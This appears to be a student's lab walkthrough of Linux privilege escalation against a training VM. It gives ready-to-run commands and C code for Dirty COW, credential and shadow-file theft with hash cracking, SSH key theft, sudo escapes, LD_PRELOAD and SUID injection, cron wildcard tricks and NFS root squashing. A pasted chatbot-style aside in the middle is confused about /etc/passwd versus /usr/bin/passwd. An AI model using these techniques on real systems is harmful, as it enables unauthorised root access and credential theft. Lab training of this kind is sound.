```
ssh -o HostKeyAlgorithms=+ssh-rsa TCM@10.82.178.104
```

# Privilege Escalation - Kernel Exploits

1. In command prompt type:

**/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh**

2. From the output, notice that the OS is vulnerable to “dirtycow”.

Exploitation
1. In command prompt type:

**gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w**

2. In command prompt type: **./c0w**

**Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.**

3. In command prompt type: **passwd**

4. In command prompt type: **id**


From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary
```
cp /tmp/passwd /usr/bin/passwd
```
Did you run a command to generate that file? For example:

- Did you copy the original? cat /etc/passwd > /tmp/passwd
    
- Did you edit it? vi /tmp/passwd
    
- Did you download it from your local machine?
    

**To check if it exists, run:**

codeBash

```
ls -l /tmp/passwd
```

If you get "No such file," the file isn't there.

### 2. You might be on the wrong machine

Check your command prompt. Does it say TCM@hostname?

- If you created /tmp/passwd on your **local machine** (the one where you ran the VPN), it won't be visible on the **SSH server** (10.82.178.104) unless you upload it using scp.
    

### 3. Are you trying to add a root user?

If your goal is to overwrite the password file to gain root access (a common CTF/Lab technique), you usually want to target /etc/passwd, not /usr/bin/passwd.

- **/etc/passwd**: The text file containing user accounts (The target for exploits).
- **/usr/bin/passwd**: The actual program that changes passwords.
**If you are trying to replace the account list, the command is usually:
```
cp /tmp/passwd /etc/passwd
```

# Privilege Escalation - Stored Passwords (Config Files)
### **Exploitation**
Linux VM

1. In command prompt type: **cat /home/user/myvpn.ovpn**
2. From the output, make note of the value of the “auth-user-pass” directive. (/etc/openvpn/auth.txt)
3. In command prompt type: **cat /etc/openvpn/auth.txt**
4. From the output, make note of the clear-text credentials.
5. In command prompt type: **cat /home/user/.irssi/config | grep -i passw**
6. From the output, make note of the clear-text credentials.

# Privilege Escalation - Stored Passwords (History)
**Exploitation**
Linux VM
1. In command prompt type: **cat ~/.bash_history | grep -i passw**
2. From the output, make note of the clear-text credentials.

# Privilege Escalation - Weak File Permissions
Detection
Linux VM
1. In command prompt type:

**ls -la /etc/shadow**

Exploitation
Linux VM
1. In command prompt type: **cat /etc/passwd**
2. Save the output to a file on your attacker machine
3. In command prompt type: **cat /etc/shadow**
4. Save the output to a file on your attacker machine
Attacker VM  
1. In command prompt type: **unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt**
Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:
**hashcat -m 1800 unshadowed.txt rockyou.txt -O**

# Privilege Escalation - SSH Keys
Detection
1. In command prompt type:
Linux VM
**find / -name authorized_keys 2> /dev/null**
2. In a command prompt type:
find / -name id_rsa 2> /dev/null  
Exploitation
3. Copy the contents of the discovered id_rsa file to a file on your attacker VM.
Attacker VM  
1. In command prompt type: chmod 400 id_rsa
2. In command prompt type: **ssh -i id_rsa root@<ip>**
You should now have a root shell :)

# Privilege Escalation - Sudo (Shell Escaping)
**Detection**﻿
1. In command prompt type: **sudo -l**
2. From the output, notice the list of programs that can run via sudo.
**Exploitation**
3. In command prompt type any of the following:
a. **sudo find /bin -name nano -exec /bin/sh \;**
b. **sudo awk 'BEGIN {system("/bin/sh")}'**
c. **echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse**
d. **sudo vim -c '!sh'**

# Privilege Escalation - Sudo (Abusing Intended Functionality)

**Detection**
1. In command prompt type: **sudo -l**
2. From the output, notice the list of programs that can run via sudo.
**Exploitation**
Linux VM
3. In command prompt type:
**sudo apache2 -f /etc/shadow**
4. From the output, copy the root hash.
Attacker VM
5. Open command prompt and type:
**echo '[Pasted Root Hash]' > hash.txt**
6. In command prompt type:
**john --wordlist=/usr/share/wordlists/nmap.lst hash.txt**
7. From the output, notice the cracked credentials.

# Privilege Escalation - Sudo (LD_PRELOAD)

**Detection**
Linux VM
1. In command prompt type: **sudo -l**
2. From the output, notice that the **LD_PRELOAD** environment variable is intact.
**Exploitation**
3. Open a text editor and type:
**#include <stdio.h>**
**#include <sys/types.h>**
**#include <stdlib.h>**
**void _init() {**
    **unsetenv("LD_PRELOAD");**
    **setgid(0);**
    **setuid(0);**
    **system("/bin/bash");**
**}**
4. Save the file as x.c
5. In command prompt type:
**gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles**
6. In command prompt type:
**sudo LD_PRELOAD=/tmp/x.so apache2**
7. In command prompt type: **id**

# Privilege Escalation - SUID (Shared Object Injection)
**Detection**
Linux VM
1. In command prompt type: **find / -type f -perm -04000 -ls 2>/dev/null**
2. From the output, make note of all the SUID binaries.
3. In command line type:
**strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"**
4. From the output, notice that a .so file is missing from a writable directory.
**Exploitation**
Linux VM
5. In command prompt type: **mkdir /home/user/.config**
6. In command prompt type: **cd /home/user/.config**
7. Open a text editor and type:
**#include <stdio.h>**
**#include <stdlib.h>**
**static void inject() __attribute__((constructor));**
**void inject() {**
    **system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");**
**}**
8. Save the file as **libcalc.c**
9. In command prompt type:
**gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c**
10. In command prompt type: **/usr/local/bin/suid-so**
11. In command prompt type: **id**
# Privilege Escalation - SUID (Symlinks)

**Detection**
Linux VM
1. In command prompt type: **dpkg -l | grep nginx**
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.
**Exploitation**
Linux VM – Terminal 1
3. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: **su root**
4. The root password is **password123**
5. Once escalated to root, in command prompt type: **su -l www-data**
6. In command prompt type: **/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log**
7. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
Linux VM – Terminal 2
8. Once logged in, type: **su root**
9. The root password is **password123**
10. As root, type the following: **invoke-rc.d nginx rotate >/dev/null 2>&1**
11. Switch back to the previous terminal.
Linux VM – Terminal 1
12. From the output, notice that the exploit continued its execution.
13. In command prompt type: **id**

# Privilege Escalation - SUID (Environment Variables #1)

**Detection**
Linux VM
1. In command prompt type: **find / -type f -perm -04000 -ls 2>/dev/null**
2. From the output, make note of all the SUID binaries.
3. In command prompt type: **strings /usr/local/bin/suid-env**
4. From the output, notice the functions used by the binary.
**Exploitation**
Linux VM
5. In command prompt type:
**echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c**
6. In command prompt type: **gcc /tmp/service.c -o /tmp/service**
7. In command prompt type: **export PATH=/tmp:$PATH**
8. In command prompt type: **/usr/local/bin/suid-env**
9. In command prompt type: **id**
# Privilege Escalation - SUID (Environment Variables #2)
**Detection**
Linux VM
1. In command prompt type: **find / -type f -perm -04000 -ls 2>/dev/null**
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings **/usr/local/bin/suid-env2**
4. From the output, notice the functions used by the binary.
**Exploitation Method #1**
Linux VM
5. In command prompt type:
**function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }**
6. In command prompt type:
**export -f /usr/sbin/service**
7. In command prompt type: **/usr/local/bin/suid-env2**
**Exploitation Method #2**
Linux VM
8. In command prompt type:
**env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'**

# Privilege Escalation - Capabilities
Detection
Linux VM
1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.
Exploitation
Linux VM
3. In command prompt type:
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
4. Enjoy root!

- **getcap**: The tool itself.
- **-r**: **Recursive**. Search through every folder.
- **/**: Start at the very top of the file system.
- **2>/dev/null**: Hide all the "Permission Denied" errors that happen when you try to look into folders you don't own.
# Privilege Escalation - Cron (Path)
**Detection**
Linux VM
1. In command prompt type: **cat /etc/crontab**
2. From the output, notice the value of the “PATH” variable.
**Exploitation**
Linux VM
3. In command prompt type:
**echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh**
4. In command prompt type: **chmod +x /home/user/overwrite.sh**
5. Wait 1 minute for the Bash script to execute.
6. In command prompt type: **/tmp/bash -p**
7. In command prompt type: **id**

# Privilege Escalation - Cron (Wildcards)

**Detection**
Linux VM
1. In command prompt type: **cat /etc/crontab**
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: **cat /usr/local/bin/compress.sh**
4. From the output, notice the wildcard (*) used by ‘tar’.
**Exploitation**
Linux VM
5. In command prompt type:
**echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh**
2. **touch /home/user/--checkpoint=1**
3. **touch /home/user/--checkpoint-action=exec=sh\ runme.sh**
6. Wait 1 minute for the Bash script to execute.
7. In command prompt type: **/tmp/bash -p**
8. In command prompt type: **id**

# Privilege Escalation - Cron (File Overwrite)
**Detection**
Linux VM
1. In command prompt type: **cat /etc/crontab**
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: **ls -l /usr/local/bin/overwrite.sh**
4. From the output, notice the file permissions.
**Exploitation**
Linux VM
5. In command prompt type:
**echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh**
6. Wait 1 minute for the Bash script to execute.
7. In command prompt type: **/tmp/bash -p**
8. In command prompt type: **id**

### Technical Explanation (RUID vs. EUID)
- **RUID (Real User ID):** Who you actually logged in as (e.g., user).
- **EUID (Effective User ID):** The ID the process is currently using (e.g., root).
Modern Linux systems check if **RUID == EUID**. If they aren't the same, Bash resets the EUID to match the RUID. The -p flag disables this reset, allowing you to operate as the Effective User (root).
### Summary
The -p flag is the **"Turn off security"** switch for Bash. Without it, your root-owned shell is useless; with it, you are officially the **System Administrator (root)**.

# Privilege Escalation - NFS Root Squashing
If you are looking at this file during a security lab, you are likely looking for one specific, highly dangerous setting: **no_root_squash**.

#### The "Squashing" Concept:

- **Normal Behavior (root_squash):** If a remote user connects to a shared folder as "root" on their own machine, the server doesn't trust them. It "squashes" their power, turning them into a lowly user (usually named nobody).
    
- **The Vulnerability (no_root_squash):** This tells the server: "If a remote user says they are root on their machine, trust them. Let them act as root in this shared folder."

**Detection**
Linux VM
1. In command line type: **cat /etc/exports**
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
**Exploitation**
Attacker VM
3. Open command prompt and type: **showmount -e 10.82.178.104**
4. In command prompt type: **mkdir /tmp/1**
5. In command prompt type: **mount -o rw,vers=2 10.82.178.104:/tmp /tmp/1**
In command prompt type:
**echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c**
6. In command prompt type: **gcc /tmp/1/x.c -o /tmp/1/x**
7. In command prompt type: **chmod +s /tmp/1/x**
Linux VM
8. In command prompt type: **/tmp/x**
9. In command prompt type: **id**
